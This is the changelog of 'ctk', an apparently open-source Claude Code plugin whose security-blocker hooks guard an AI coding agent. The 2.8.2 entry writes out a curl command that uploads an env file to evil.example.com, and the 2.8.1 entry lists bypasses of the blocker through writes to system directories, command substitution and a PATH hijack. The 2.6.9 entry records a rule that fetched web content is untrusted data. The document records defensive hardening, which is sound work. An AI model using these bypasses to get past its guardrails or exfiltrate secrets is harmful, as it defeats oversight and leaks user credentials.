# Changelog

All notable changes to the continuity-toolkit (`ctk`) plugin will be documented in this file.

## [2.8.2] - 2026-07-19 — secret files could be uploaded with curl's `@` file operand

### Fixed

**A secret file could be exfiltrated even though reading it was blocked.** The env-file patterns only start matching after whitespace, a quote, `=`, `/` or `(`. curl's file-operand syntax puts the filename directly after `@`, which was not in that set — so `cat` of an env file was denied while `curl -d @<envfile> https://evil.example.com` sailed through and uploaded the contents verbatim. Worse than the read it was meant to prevent: the data leaves the machine.

Confirmed end-to-end against the compiled hook, not just the bare regex — `-d`, `-X POST -d`, `--data`, `--data-binary` and `-F file=@` were all allowed, for both `.env` and `.envrc`, and nothing else backstopped it (not the dangerous-bash http registry, not `ENV_DUMP_PATTERNS`).

The fix adds `@` to the lookbehind class. It is a pure tightening with no false-positive cost — scoped npm packages (`npm i @scope/pkg`), `ssh user@host` and `git log --author=@me` carry no env-file token to match, and each is pinned as a regression test. This matters because a PreToolUse deny is terminal for a forked skill, so over-blocking is not a lesser evil than the bypass.

### Added

**Dotted-prefix laundering is now pinned** (`cat my.process.env`, `touch x.process.env`, `cp secrets x.process.env`, …). These already passed; they are pinned because a *proposed* relaxation for this release — exempting `process.env` at any dot-segment boundary, so that `globalThis.process.env` stopped being a false positive — would have flipped every one of them to allowed. The existing suite could not have caught it: the two laundering cases pinned in 2.8.1 use a hyphen (`build-process.env`) and a bare prefix (`preprocess.env`), never a dot, leaving the whole family unprobed. **The change would have shipped green.** It was withdrawn at the design gate after independent adversarial review.

### Not fixed (deliberately)

`globalThis.process.env` and `window.process.env` are still blocked as false positives. Bare `process.env` and `import.meta.env` work, and that is the common spelling. Two independent designs to relax this have now failed for the same structural reason recorded in this file for system directories: `globalThis.process.env` and `my.process.env` are lexically identical, so no regex over unparsed text can permit the first without permitting the second. Any future attempt must confront the pinned laundering family above.

Three known gaps remain queued, each its own change because all three *add* blocking: patterns require a trailing slash (`rm -r /etc` misses); patterns are case-sensitive (`/ETC/passwd` misses on macOS); and line 171's `.envrc` lookaheads exempt an idiom that does not exist in any language and should be deleted rather than carried forward.

## [2.8.1] - 2026-07-19 — narrow security-blocker fixes; the read carve-out was attempted twice and withdrawn

`BASH_SENSITIVE_PATTERNS` matches the **raw text** of a command against a path list, for every command, regardless of what the command does. Mentioning a path is enough — so a `--version` probe on an absolute binary path, `cat /etc/hosts`, and any script or commit message containing `process.env` were all denied. Because a PreToolUse deny is **terminal for a subagent**, this silently killed multi-agent runs mid-flight; four agents died this way while reviewing ctk 2.8.0.

**This release fixes only the part that can be fixed safely.** Two attempts to allow read-only access to system directories were built and both were demolished by adversarial review before merge:

1. A **blocklist of mutating verbs** let every writer outside the list through — `python3 -c "open(…,'w')"`, `sed -i`, `find -delete`, `tar -C`, `touch`, `mkdir`, `git checkout --`. It also missed fd-numbered redirects (`1>`), compared only the *first* path occurrence against the redirect position (so `cat <sysfile> > <sysfile>` passed), and let `cd <sysdir> && rm -rf .` launder the target into another segment.
2. An **allowlist of safe readers** leaked through a pipe-then-absolute-path segment split (`ls | /usr/bin/tee <syspath>`), through command substitution (`cat "$(touch <syspath>)"`, which also readmitted `sed -i` and `find -delete`), and through two-operand writers that ride in on the allowlist — `sort -o`, `uniq IN OUT`, `xxd IN OUT`.

Both share one root cause: deciding *"is this path the target of a write?"* requires a shell parse, and a position-0 regex over unparsed text was certifying a segment that can hold more than one command. The payoff was convenience; the demonstrated failure mode was arbitrary writes to `/usr/local/bin` and `/etc/cron.d` — a PATH hijack needing no sudo on a default Homebrew Mac. **System directories therefore stay deny-by-default.** The nine demonstrated bypasses ship as regression tests so a future attempt has to confront them rather than rediscover them.

### Fixed — the narrowly-safe half

- **The `process.env` / `import.meta.env` idioms no longer read as file access.** The exemption is anchored to the **exact token**, not to preceding bytes: a byte test (`(?<!process)`) would also suppress real filenames like `build-process.env` and could be laundered by creating one. This was the most frequent false positive by far — it blocked commits whose *message* described an environment variable.
- **`/proc/<pid>/environ` is now always blocked.** `ENV_DUMP_PATTERNS` exists to stop env-var leakage via `env`/`printenv`; reading it out of procfs walked straight around that control.
- **A bare `env`/`printenv` invoked by absolute path is now caught on its own merits.** It was previously blocked only as a side effect of the blanket system-binaries rule — as the old test's own comment admitted — so any relaxation of that rule would have opened a real dump bypass.
- **Credential material under otherwise-readable trees** — private TLS keys, kube and docker config, mounted secrets, keytabs, `p12`/`pfx`/`jks`, kubeconfig. The filename pattern requires a **name before the extension** and rejects property access, after a first draft denied `jq '.key'`, `m.key(1)` and `schema.key.ts` — a fresh instance of the very over-blocking this release exists to fix.

### Known gaps, deliberately not addressed here

- System-directory patterns require a **trailing slash**, so a bare operand (`rm -r /etc`) misses. Pre-existing and identical on 2.8.0; tightening it would add blocks, which is the opposite of this release's purpose, so it is left for its own change.
- Patterns are **case-sensitive**, so `/ETC/passwd` misses on a case-insensitive filesystem. Pre-existing, same on 2.8.0.
- `globalThis.process.env` and `window.process.env` remain denied — the exemption is exact-token by design.

## [2.8.0] - 2026-07-19 — context warnings never fired; statusline surfaces discarded payload fields

### Fixed — the context-warning pipeline was dead for every user

**ctk's flagship feature did not work.** The statusline writes the context-percentage file and the `context-monitor` hook reads it, keyed by session id on both sides — but the two used *different precedence*. The writer read `process.env.CLAUDE_SESSION_ID` only, and **Claude Code does not export that variable into the statusline child process**, so every file was written as `claude-context-pct-default.txt`. The hook receives `session_id` in its input and looked for `claude-context-pct-<uuid>.txt`, which never existed. `readPercentage()` returned null, `contextMonitor()` silent-succeeded, and the 70/80/90% warnings could not fire for anyone.

The failure was invisible by construction: a missing file is a legitimate "statusline not configured" state, logged at **debug** level while the default log level is `warn`. Nothing errored; the feature simply never ran.

Proven on a live machine before and after: with the old build, the only file present was `-default.txt` while the hook — queried with the real session id — returned bare `{"continue":true,"suppressOutput":true}`. With the fix, the statusline writes `claude-context-pct-<session>.txt` and the same hook returns the 85% warning. `extractSessionId()` now mirrors the hook's `getSessionId()` precedence exactly (payload → env → `default`), with a test that asserts the two agree across every input shape.

This is the fourth hook in this repo found firing and doing nothing, after `lint-checker`, `error-warner` (both 2.7.3), and `/etk:review-mr`'s empty return (etk 2.14.1).

### Statusline surfaces the payload fields it was discarding

Claude Code hands the statusline a rich JSON payload on stdin; ctk parsed six fields and dropped the rest. Evaluated [claude-hud](https://github.com/jarrodwatts/claude-hud) (MIT) as a reference and adopted only what needs no new data source — the transcript-parsing features stay claude-hud's, cited rather than rebuilt. Field presence was **verified against a real captured payload** (CC 2.1.214), not assumed from docs. **`dist` rebuilt.**

### Added

- **Effort / mode badge** in the model bracket — `[Opus 4.8 ◐ xhigh]`, or `⚡ fast` in fast mode. From `effort.level`, `fast_mode`, `thinking.enabled` (verified live: `effort.level = "xhigh"`).
- **Rate-limit reset countdowns** — `session: █░░░░░░░░░ 11% (resets in 4h 31m)`. From `rate_limits.*.resets_at`, a Unix timestamp in **seconds** (verified live). Read independently of `used_percentage`, since either may be absent alone.
- **Token accounting line** — `tokens: 217.4k in · 826 out · 215.8k cached`. Counts are abbreviated because 1M-context sessions are live (`context_window_size = 1000000` observed), where raw figures are unreadable at statusline size. The cached segment is omitted when there are no cache reads.
- **Open-PR segment** — `PR #35 pending`, from `pr.{number,review_state}`. **Documented in the official schema but absent from the live capture** (the payload omits `pr` unless an open PR exists for the branch), so it is deliberately defensive: rendered only when the object and a numeric `number` are both present.
- **`CONTINUITY_STATUSLINE_COMPACT=1`** collapses output to the classic two lines.
- **`CONTINUITY_STATUSLINE_SILENT=1` — run alongside another statusline instead of instead of it.** Claude Code runs exactly one `statusLine` program, and running ctk's script is what writes the file the `context-monitor` hook reads, so adopting claude-hud (or any other statusline) previously meant giving up the context warnings. Silent mode performs the side effect and prints nothing, letting the other program own every pixel while the warnings keep firing. Every stdout path routes through one `emit` wrapper, including the fallback string, so nothing can leak into the other program's output. `/ctk:setup-context-monitor` Step 1a documents the composed launcher — including that stdin is consumable once and must be captured before being fed to both, and that a tool with its own configurator must be set up *first* because it claims `statusLine`. Verified end-to-end: with a stand-in HUD composed in, the display showed the HUD's lines only, ctk still wrote `pct=91`, and the hook returned `CONTEXT CRITICAL: 91%+`.
- **Two guards added after diffing the built output against 2.7.4** (neither was caught by unit tests): the token line is suppressed when every count is zero — a `context_window` with no token fields was rendering the pure-noise line `tokens: 0 in · 0 out` — and a reset countdown beyond eight days is treated as a malformed timestamp and omitted, since a `resets_at` supplied in milliseconds rendered `resets in 1136754d 12h`.
- Tests covering the new extractors and formatters, including that no-extras output stays byte-identical to the previous two/three-line rendering (pinned against bytes from the 2.7.4 build, not against the new code compared with itself).

### Fixed

- **`/ctk:doctor` reported a false healthy for context warnings.** Step 4 checked only whether `~/.config/claude/continuity-statusline.sh` *exists* — but that file survives untouched when `statusLine` is repointed at another program, so a user whose context warnings were dead got an "OK". Doctor now reads the configured `statusLine.command` and reports OK / NOT CONFIGURED / **CONFLICT**, naming the program and stating the consequence. Same false-healthy class as the `check-maintenance` `*.md` glob fixed in 2.7.1.

### Changed

- **`/ctk:setup-context-monitor` no longer overwrites an existing `statusLine` silently.** It now checks first (Step 0) and stops to ask when another program is configured. It also documents the genuine either/or: Claude Code runs one statusline, and ctk's script is the sole writer of the file the `context-monitor` hook reads — so choosing another statusline turns the 70/80/90% warnings off. claude-hud is cited as the option for transcript-derived tool/agent/todo tracking, which ctk does not duplicate.

## [2.7.4] - 2026-07-18 — stop blocking CC's own scratchpad directory

`security-blocker` (and the shared `isProtectedPath()` in `path-utils`) blocked **every** reference to `/private/tmp/` — including CC's harness-managed scratchpad at `/private/tmp/claude-<uid>/<project>/<session>/scratchpad`, which the CC system prompt instructs every session and subagent to use for temporary files. **`dist` rebuilt** (shared hook source changed).

### Fixed

- **The hook was killing forked skills mid-run.** Observed live: `/etk:review-mr` (a `context: fork` skill) ran `gh pr diff N > <scratchpad>/prN.diff` in Phase 3, the security-blocker denied it, and the fork terminated on the spot with no final message — the caller received the placeholder "Skill execution completed" (the same empty-return symptom etk 2.14.1's return-contract fix targeted; some past incidents were likely *this* bug). A PreToolUse deny inside a fork was **observed to be terminal** (live observation, corroborated three times this session — forked skill, subagent, and a plain commit whose *message* contained the path string; not documented CC behavior), so any subagent or forked skill following CC's scratchpad guidance died on its first scratchpad write.
- **Carve-out is deliberately narrow.** `/\/private\/tmp\/(?!claude-\d+\/)/` in `BASH_SENSITIVE_PATTERNS` and the mirrored `SYSTEM_DIR_PATTERNS` entry allow only paths *under* `/private/tmp/claude-<uid>/`. Still blocked: all other `/private/tmp/` paths, non-numeric suffixes (`claude-x/`), and the bare `claude-<uid>` root with no trailing slash (so `rm -rf /private/tmp/claude-501` remains denied).
- **Traversal guard on the carve-out** (adversarial review finding): bash patterns match raw command text with no `..` normalization, so a companion pattern blocks any `..` segment spelled from inside the allowed prefix (`/private/tmp/claude-501/../victim`, including sibling-scratchpad hops `../claude-999`). The Write/Edit layer was already immune (`path.normalize` runs before matching).

### Added

- 5 security-blocker tests (scratchpad bash redirect + Write allowed; outside-scratchpad, bare-root `rm -rf`, and non-uid suffix still blocked) and 2 `isProtectedPath()` tests pinning the carve-out in both layers.

## [2.7.3] - 2026-07-17 — revive two hooks that shipped dead (TypeScript lint + error rules)

Two PostToolUse hooks fired on every matching edit and did nothing. Both were **silent** no-ops, which is why they survived: a hook that reports nothing is indistinguishable from a hook that finds nothing. Found by a Software Factory audit of our own guardrails. **`dist` rebuilt** (shared hook source changed).

### Fixed

- **`lint-checker` linted no TypeScript at all — in a TypeScript monorepo.** `hooks.json` gated the hook on `*.ts`/`*.tsx`/`*.js`/`*.py`, but the implementation only ever handled `.py`/`.pyi`, so every TS edit spawned the hook and got zero lint. Biome was configured but no PostToolUse hook invoked it. The hook now lints JS/TS via **biome** alongside Python via **ruff**, routing per file extension. Verified end-to-end against the real built hook + real biome 1.9.4: an `x == 1` / `console.log` edit now returns `lint/suspicious/noDoubleEquals real.ts:2:7` where it previously returned silence.
- **`error-warner` could never load its rules.** Rules resolve from `$CLAUDE_PLUGIN_ROOT/.claude/rules/error_rules.json`; the hook is wired from ctk, and ctk shipped no `.claude/` directory — so `loadErrorRules()` returned `null` and the hook silently no-oped for every user, in every session. ctk now ships the default rules at the fallback path (a symlink to `shared/configs/rules/`, mirroring dtk). **No code change** — the resolution logic was always correct; the file was simply absent.
- **`lint-checker` never ran on `MultiEdit`, and never on `.jsx`/`.mjs`/`.cjs`/`.pyi`.** The `if` condition listed only `Write()`/`Edit()` clauses while the matcher claimed `Write|Edit|MultiEdit`, so no MultiEdit ever satisfied it — leaving multi-file edits unlinted **including Python**, a pre-existing gap in the ruff path. All clauses and extensions added.

### Added

- **Biome support in `lint-checker`**: `findBiome()` (project `node_modules/.bin` → PATH), `runBiomeCheck()`, `normalizeBiomeDiagnostic()`, and `offsetToRowCol()`. A single `biome check` yields both lint and format results, unlike ruff's separate `check` / `format --check`.
- **`LintViolation`**, the shared display shape both linters normalize into. `RuffViolation` is structurally assignable to it, so widening the formatters left all 46 existing ruff tests passing untouched — and the biome path avoids forging ruff-only fields (`noqa_row`, `end_location`) that would have been meaningless.
- **Security classification spans both linters**: ruff's bandit `S`-prefix *or* biome's `lint/security/*` category.
- **Format hints name the right formatter** — `biome format --write` for JS/TS, `ruff format` for Python.
- **28 regression tests** (`lint-checker-biome.test.ts`, `error-warner-rules-resolution.test.ts`). The error-warner tests deliberately **do not mock** `loadErrorRules` — the existing suite mocks it, supplying rules production never had, which is precisely how the hook shipped inert.

### Notes

- Biome's JSON schema is not ruff-shaped and the tests are pinned to real 1.9.4 output: `location.path` is an object, `location.span` is a **byte-offset pair** (converted via `Buffer` — UTF-16 string slicing corrupts any non-ASCII source), and `format` diagnostics carry a **null span**.
- Both hooks remain **advisory** (`continue: true`) by design. PostToolUse fires after the tool has run, so it cannot un-run it; blocking belongs to PreToolUse.
- Unverified: whether CC's `if` evaluator extracts paths from `MultiEdit`'s `edits` array. The added clauses are monotonic — worst case a no-op, best case they close the gap.

## [2.7.2] - 2026-07-10 — rtk (token-optimizing proxy) compatibility for command-matching hooks

Makes ctk's command-matching hooks proxy-aware so a token-optimizing CLI proxy — e.g. [rtk](https://github.com/rtk-ai/rtk), whose PreToolUse hook rewrites `git status` → `rtk git status` via `updatedInput` — does not regress permissions or git validation. `security-blocker` already stripped the proxy prefix; the remaining matchers did not — a latent, half-wired gap (the `stripProxyPrefix()` helper existed but was wired into only one of the command-matching hooks). **`dist` rebuilt** (shared hook source changed).

### Fixed

- **Permission regression under an active CLI proxy**: `auto-approve-safe-bash` matched the raw command, so `rtk git status` / `rtk ls` / `rtk grep …` missed the read-only allowlist and fell through to a prompt — defeating the proxy's transparency. It now unwraps the proxy prefix **per segment** before the safe/approval checks. Verified by a runtime harness against the live rtk 0.43.0 hook: every proxied read-only command flips back to auto-approve, while `rtk git push` and `rtk rm -rf ~` still correctly defer.
- **`git-validator`** no longer skips commit-message / branch validation for `rtk git commit …`.
- **`profile-evaluator`** now matches permission-profile rules against the unwrapped command.
- **`bash-combined`** npm-audit advisory unwraps the prefix too (npm isn't rtk-proxied today; keeps the combined pretool path uniformly proxy-aware).

### Notes

- Reuses the existing `stripProxyPrefix()` helper (single source in `lib/input.ts`), mirroring `security-blocker` — no new mechanism, no rebuild of rtk's capability.
- `preflight-context-injector` (advisory context injection only) is intentionally left unchanged; a missed hint is benign, not a security or permission regression.
- 8 rtk regression cases added to the `auto-approve-safe-bash` test suite (1889 ctk tests green).

## [2.7.1] - 2026-07-09 — archive-handoffs .yaml glob fix + shared-hook-count doc reconciliation

Follow-up cleanup after the 2.7.0 cross-fork adoption. Docs/command-definition only — no runtime hook behavior changed, no `dist` rebuild.

### Fixed

- **`archive-handoffs` false-healthy / miss-all bug**: the command scanned, counted, and archived handoffs with a `*.md`-only glob, but handoffs are `*.yaml` since the v3.0 format — so **no `.yaml` handoff would ever be archived** (same class as the `check-maintenance` bug fixed in 2.7.0). All handoff globs now match `*.yaml` + legacy `*.md` (active scan, archive listing, active count, restore example, expected-format list).

### Changed

- **Shared-hook-count doc reconciliation**: the count was stated inconsistently across docs (27 / 28 / 30). Reconciled to the verifiable basis — `registerHook()` calls in `hooks/src/index.ts` = **35 registered (32 shared, symlinked from `shared/hooks-infra/src/hooks/`, + 3 ctk-specific: `hipaa-context-injector`, `phi-output-redactor`, `session-loader`)**. Updated `plugin.json`/`marketplace.json`/`README`/root `CLAUDE.md`/ctk `CLAUDE.md`, and added a **canonical-basis note** to ctk `CLAUDE.md` so the number can be re-derived and stops drifting.

## [2.7.0] - 2026-07-09 — read-cache Read/Edit deadlock fix + secret-skip (cross-fork adoption) + continuity-maintenance doc fixes

Cross-fork adoption from the internal toolkit fork. Adds the delta-cache invalidator (27th shared hook) + advance-on-serve, and fixes several continuity-maintenance doc bugs the fork's skill-audit sweep surfaced. Hook source changed → tracked `dist/` rebuilt.

### Added

- **`posttool/read-cache-invalidator` shared hook** (27th) — refreshes the per-session delta-cache base after every `Write|Edit|MultiEdit` so a subsequent `Read` of the just-edited file hash-matches and is not intercepted with a stale diff. Wired into ctk's `PostToolUse(Write|Edit|MultiEdit)` group.
- Shared **`snapshotFileToCache()`** helper — one choke point for "snapshot file → cache", reused by the read writer, the new edit invalidator, and pretool advance-on-serve. Unit tests + a full deadlock reproduction/self-heal suite (`read-cache-deadlock.test.ts`).

### Fixed

- **Read/Edit deadlock**: the cache writer fired on `Read` only, so `Write/Edit/MultiEdit` never refreshed the cached bytes; a re-Read of a just-edited file saw `cached != disk`, was intercepted with a diff, and **denied** — and a denied Read can't satisfy the harness read-before-edit gate. Two fixes: the new PostToolUse invalidator refreshes the base post-edit, and the pretool hook now **advances the base whenever it serves a diff** so out-of-band changes (e.g. a git branch switch) self-heal on the second Read.
- **`check-maintenance` false-healthy bug**: the handoff-count check globbed `*.md`, but handoffs are `*.yaml` since the v3.0 format — the 20/40 warning could never fire. Now counts both `*.yaml` and legacy `*.md`.
- **`check-maintenance` dead route**: recommended `/archive-shared-context` (no such command) in 3 places → replaced with the real remediation (manual shared-context.json prune).
- **Dirty-tracking threshold drift**: docs said auto-suggest fires at 20 edits; the `dirty-state-tracker` hook's real thresholds are **15 (warn) / 25 (auto-suggest)**. Doc references corrected and the hook named as canonical. Also single-sourced the numeric health thresholds into the `/check-maintenance` command (other files point at it) and fixed one stale `handoff-<date>.md` naming reference.

### Security

- **Delta-cache never persists secret-bearing file content** (`snapshotFileToCache`): skips files matching the security layer's env/ssh/credential patterns (`.env*`, `.ssh/id_*`, `secrets.y(a)ml`, `credentials.json`, `.npmrc`, `.netrc`, …) before writing to `~/.claude/cache`. Filters in the one shared choke point, covering the read writer, the edit invalidator, and pretool advance-on-serve.

## [2.6.11] - 2026-06-25 — rebrand to Claude Forge

Suite renamed `claude-dev-kit` → **Claude Forge**. Updated repository/homepage URLs and the `session-loader` window-title example; dist rebuilt. No behavior change beyond the rename. Re-add the marketplace and reinstall as `ctk@claude-forge`.


## [2.6.10] - 2026-06-24 — strip company-specific domain reference from HIPAA hook

Part of a monorepo-wide pass removing company-specific domain references and genericizing example data across every plugin.

### Changed

- **Removed the `health coach` keyword from the HIPAA context-injector hook's health-domain rule** (the rest of the rule is unchanged) and rebuilt the tracked `dist/`. No behavior change beyond the dropped keyword.

## [2.6.9] - 2026-06-19 — web-research: trust boundary + internal MCP sources

Skills-security audit hardening (`docs/reviews/2026-06-19_skills-security-audit.md`).

### Security

- **`web-research-analyst` agent now states an explicit trust boundary** — fetched web/API/search content is untrusted DATA, not instructions (covers the default WebFetch path, not just agent-browser): ignore embedded directives, don't follow page-invented URLs, and pass `--content-boundaries` on agent-browser escalation. Also dropped the unused `Write` tool from the agent to shrink injection blast radius.

### Changed

- **`/ctk:web-research` now blends internal + external sources.** The command queries connected MCP servers (Atlassian/Confluence, Google Drive, …) for internal context and dispatches the `web-research-analyst` agent for public web sources, synthesizing with per-source citations (`internal:<server>` / `web:<url>`). The agent gained a **Sources** section clarifying it covers the web tier and that MCP-relayed content is untrusted too. Internal sources are queried by the (MCP-capable) command, not the restricted subagent — so it stays domain-agnostic (no hardcoded server names).

## [2.6.8] - 2026-06-17 — rebuild: ship compiled JS for the 2.6.7 statusline features

### Fixed

- **Rebuilt the tracked `dist/` so 2.6.7's statusline features actually ship.** 2.6.7 updated the statusline TypeScript (cost-format fix + account-usage bars) but the committed `dist/src/statusline/context-percentage.js` was not regenerated, so installs ran the stale compiled build against the new source. This release ships only the rebuilt artifact — no source changes vs 2.6.7.

## [2.6.7] - 2026-06-17 — statusline: legible cost formatting + account-usage bars

Domain-agnostic statusline improvements ported from the internal toolkit fork.

### Fixed

- **`formatCost` legibility** — costs ≥ $10 now render as whole dollars with thousands separators (`$356`, `$1,234`) instead of an unconditional `toFixed(2)`. At statusline font size the decimal point in `$356.00` was easily misread as `$35600`. Costs < $10 keep two decimals.

### Added

- **Optional third statusline line** showing session (5-hour) and weekly (7-day) account-usage progress bars from CC v2.1.176+ `rate_limits.{five_hour,seven_day}.used_percentage`. Self-degrading: the line is omitted entirely when `rate_limits` is absent (API/Bedrock users, before the first API response), keeping the existing two-line output byte-identical. No network call. Bundled tests cover both-present / each-absent / NaN-guard / threshold-coloring / 2-line-vs-3-line.

## [2.6.6] - 2026-06-14 — first open-source release

Session continuity and context management: multi-session state persistence with ledger tracking, handoff documents, dirty-file tracking, context-window monitoring, and security guardrails. 11 skills, 1 agent, 12 commands.

### Highlights

- **Canonical owner of all shared hooks** (security, permissions, lifecycle, post-tool, HIPAA context injection). Install alongside the other plugins for full hook coverage.
- MIT licensed.

_First public release at 2.6.6; earlier version history was internal and has been omitted._
